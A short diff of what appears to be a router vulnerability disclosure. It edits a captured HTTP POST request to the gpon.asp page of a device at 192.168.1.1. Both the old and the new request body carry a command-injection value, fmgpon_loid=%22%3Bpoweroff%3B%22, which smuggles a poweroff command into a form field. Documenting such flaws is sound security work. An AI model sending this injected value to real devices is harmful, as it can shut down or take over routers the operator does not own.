@@ -41,9 +41,7 @@ ri/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/
 signed-exchange;v=b3;q=0.9
 Referer: http://192.168.1.1/gpon.asp
-fmgpon_loid=%22%3Bpoweroff%3B%22&fmgpon_loid_password=&fmgp
-on_ploam_password=1234567890&omci_olt_mode=0&apply=Apply+Ch
-anges&submit-url=%2Fgpon.asp&postSecurityFlag=42231
+fmgpon_loid=%22%3Bpoweroff%3B%22
 ```
 
 Before the attack, the target device is in a normal state.
